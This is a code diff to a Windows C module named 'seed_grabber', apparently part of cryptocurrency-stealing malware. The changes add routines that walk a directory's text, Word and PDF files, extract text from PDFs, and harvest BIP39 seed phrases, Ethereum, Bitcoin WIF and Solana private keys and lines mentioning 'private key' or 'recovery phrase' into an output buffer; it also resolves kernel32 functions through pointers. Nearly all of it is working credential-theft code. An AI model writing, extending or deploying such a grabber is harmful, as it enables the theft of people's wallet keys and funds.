@@ -13,7 +13,7 @@
 
 #define SEED_MAX_PATH 512
 #define SEED_READ_BUF (64 * 1024)
-#define SEED_MAX_PHRASES 64
+#define SEED_MAX_PHRASES 128
 
 /* ── API function pointer types (kernel32.dll) ──────────────────── */
 
@@ -386,6 +386,211 @@ static int count_bip39_in_text(const char *text, int *match_count) {
     return 0;
 }
 
+/* ── Base58 character check (alphanumeric minus 0OIl) ──────────── */
+
+static int is_base58(char c) {
+    return (c >= '1' && c <= '9') || (c >= 'A' && c <= 'H') ||
+           (c >= 'J' && c <= 'N') || (c >= 'P' && c <= 'Z') ||
+           (c >= 'a' && c <= 'k') || (c >= 'm' && c <= 'z');
+}
+
+/* ── Hex digit check ──────────────────────────────────────────── */
+
+static int is_hex_char(char c) {
+    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
+}
+
+/* ── Scan a single line for crypto key patterns ───────────────── */
+
+static int match_eth_key(const char *line, size_t len) {
+    return (len >= 66 && line[0] == '0' && (line[1] == 'x' || line[1] == 'X') &&
+            is_hex_char(line[2]) && is_hex_char(line[3]));
+}
+
+static int match_btc_wif(const char *line, size_t len) {
+    if ((len < 51 || len > 52) || (line[0] != '5' && line[0] != 'K' && line[0] != 'L'))
+        return 0;
+    for (size_t i = 1; i < len; i++)
+        if (!is_base58(line[i])) return 0;
+    return 1;
+}
+
+static int match_solana_key(const char *line, size_t len) {
+    if (len < 64 || len > 88) return 0;
+    for (size_t i = 0; i < len; i++)
+        if (!is_base58(line[i])) return 0;
+    return 1;
+}
+
+static int match_crypto_keyword(const char *line, size_t len) {
+    char lower[512];
+    size_t n = len < sizeof(lower) - 1 ? len : sizeof(lower) - 1;
+    for (size_t i = 0; i < n; i++)
+        lower[i] = (char)tolower((unsigned char)line[i]);
+    lower[n] = '\0';
+
+    static const char *keywords[] = {
+        "seed", "mnemonic", "private key", "recovery phrase", "secret key",
+        NULL
+    };
+    for (int i = 0; keywords[i]; i++) {
+        if (strstr(lower, keywords[i]))
+            return 1;
+    }
+    return 0;
+}
+
+static void scan_crypto_keys(const char *buf, size_t buflen,
+                             char *output, size_t outlen, size_t *pos) {
+    if (!buf || !output || !pos || outlen == 0) return;
+
+    const char *line = buf;
+    const char *end = buf + buflen;
+
+    while (line < end && *line && *pos < outlen - 1) {
+        const char *eol = line;
+        while (eol < end && *eol && *eol != '\n' && *eol != '\r') eol++;
+        size_t linelen = (size_t)(eol - line);
+
+        if (linelen >= 66 && match_eth_key(line, linelen)) {
+            int w = snprintf(output + *pos, outlen - *pos, "ETH_KEY: %.66s\n", line);
+            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
+        }
+        if (linelen >= 51 && match_btc_wif(line, linelen)) {
+            char tmp[53];
+            size_t cplen = linelen < 52 ? linelen : 52;
+            memcpy(tmp, line, cplen);
+            tmp[cplen] = '\0';
+            int w = snprintf(output + *pos, outlen - *pos, "BTC_WIF: %s\n", tmp);
+            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
+        }
+        if (linelen >= 64 && match_solana_key(line, linelen)) {
+            char tmp[89];
+            size_t cplen = linelen < 88 ? linelen : 88;
+            memcpy(tmp, line, cplen);
+            tmp[cplen] = '\0';
+            int w = snprintf(output + *pos, outlen - *pos, "SOL_KEY: %s\n", tmp);
+            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
+        }
+        if (linelen >= 6 && match_crypto_keyword(line, linelen)) {
+            char tmp[256];
+            size_t cplen = linelen < sizeof(tmp) - 1 ? linelen : sizeof(tmp) - 1;
+            memcpy(tmp, line, cplen);
+            tmp[cplen] = '\0';
+            int w = snprintf(output + *pos, outlen - *pos, "KEYWORD: %s\n", tmp);
+            if (w > 0 && (size_t)w < outlen - *pos) *pos += (size_t)w;
+        }
+
+        line = eol;
+        while (line < end && (*line == '\n' || *line == '\r')) line++;
+    }
+}
+
+/* ── Minimal PDF text extractor (BT/ET block scanning) ────────── */
+
+static size_t extract_pdf_text(const unsigned char *data, size_t datalen,
+                               char *out, size_t outlen) {
+    if (!data || !out || outlen == 0) return 0;
+    size_t pos = 0;
+    const unsigned char *end = data + datalen;
+    const unsigned char *p = data;
+
+    while (p < end - 2) {
+        const unsigned char *bt = NULL;
+        while (p < end - 1) {
+            if (p[0] == 'B' && p[1] == 'T') { bt = p; break; }
+            p++;
+        }
+        if (!bt) break;
+
+        const unsigned char *et = NULL;
+        p = bt + 2;
+        while (p < end - 1) {
+            if (p[0] == 'E' && p[1] == 'T') { et = p; break; }
+            p++;
+        }
+        if (!et) break;
+
+        const unsigned char *s = bt + 2;
+        while (s < et) {
+            if (s + 2 <= et && s[0] == 'T' && s[1] == 'j') {
+                const unsigned char *tok = s - 1;
+                while (tok > bt + 2 && (*tok == ' ' || *tok == '\n' || *tok == '\r'))
+                    tok--;
+                if (tok > bt + 2 && *tok == ')') {
+                    const unsigned char *close_paren = tok;
+                    tok--;
+                    int depth = 1;
+                    while (tok > bt + 2 && depth > 0) {
+                        if (*tok == ')') depth++;
+                        if (*tok == '(') depth--;
+                        if (depth > 0) tok--;
+                    }
+                    if (depth == 0) {
+                        tok++;
+                        while (tok < close_paren && pos < outlen - 1) {
+                            if (*tok == '\\' && tok + 1 < close_paren)
+                                tok++;
+                            else {
+                                if (*tok >= 0x20 && *tok < 0x7f)
+                                    out[pos++] = (char)*tok;
+                            }
+                            tok++;
+                        }
+                    }
+                }
+            }
+            else if (s + 2 <= et && s[0] == 'T' && s[1] == 'J') {
+                const unsigned char *arr = s - 1;
+                while (arr > bt + 2 && (*arr == ' ' || *arr == '\n' || *arr == '\r'))
+                    arr--;
+                if (*arr == ']') {
+                    const unsigned char *scan = arr;
+                    while (scan > bt + 2) {
+                        if (*scan == ')') {
+                            const unsigned char *close2 = scan;
+                            scan--;
+                            int d = 1;
+                            while (scan > bt + 2 && d > 0) {
+                                if (*scan == ')') d++;
+                                if (*scan == '(') d--;
+                                if (d > 0) scan--;
+                            }
+                            if (d == 0) {
+                                scan++;
+                                while (scan < close2 && pos < outlen - 1) {
+                                    if (*scan == '\\' && scan + 1 < close2)
+                                        scan++;
+                                    else {
+                                        if (*scan >= 0x20 && *scan < 0x7f)
+                                            out[pos++] = (char)*scan;
+                                    }
+                                    scan++;
+                                }
+                            }
+                        }
+                        if (*scan == '[') break;
+                        scan--;
+                    }
+                }
+            }
+            s++;
+        }
+        if (pos > 0 && pos < outlen - 1 && out[pos-1] != '\n')
+            out[pos++] = '\n';
+
+        p = et + 2;
+    }
+    if (pos >= outlen) pos = outlen - 1;
+    out[pos] = '\0';
+    return pos;
+}
+
+static int is_pdf_ext(const char *name) {
+    const char *dot = strrchr(name, '.');
+    return dot && _stricmp(dot + 1, "pdf") == 0;
+}
+
 /* ── Check if filename has target extension ────────────────────── */
 
 static int has_target_ext(const char *name) {
@@ -395,6 +600,9 @@ static int has_target_ext(const char *name) {
     if (_stricmp(dot, "txt") == 0) return 1;
     if (_stricmp(dot, "json") == 0) return 1;
     if (_stricmp(dot, "md") == 0) return 1;
+    if (_stricmp(dot, "doc") == 0) return 1;
+    if (_stricmp(dot, "docx") == 0) return 1;
+    if (_stricmp(dot, "pdf") == 0) return 1;
     return 0;
 }
 
@@ -443,7 +651,24 @@ int seed_grabber_scan(const char *dir, char *output, size_t outlen) {
         buf[read] = '\0';
 
         int matches = 0;
-        count_bip39_in_text(buf, &matches);
+
+        if (is_pdf_ext(fd.cFileName)) {
+            /* PDF: extract text from BT/ET blocks, then scan */
+            char *pdf_text = (char *)sg_api.pAlloc(sg_api.pGetHeap(), 0, SEED_READ_BUF);
+            if (pdf_text) {
+                size_t plen = extract_pdf_text((const unsigned char *)buf, (size_t)read,
+                                               pdf_text, SEED_READ_BUF);
+                if (plen > 0) {
+                    count_bip39_in_text(pdf_text, &matches);
+                    scan_crypto_keys(pdf_text, plen, output, outlen, &pos);
+                }
+                sg_api.pFree(sg_api.pGetHeap(), 0, pdf_text);
+            }
+        } else {
+            count_bip39_in_text(buf, &matches);
+            scan_crypto_keys(buf, (size_t)read, output, outlen, &pos);
+        }
+
         sg_api.pFree(sg_api.pGetHeap(), 0, buf);
 
         if (matches >= 12) {
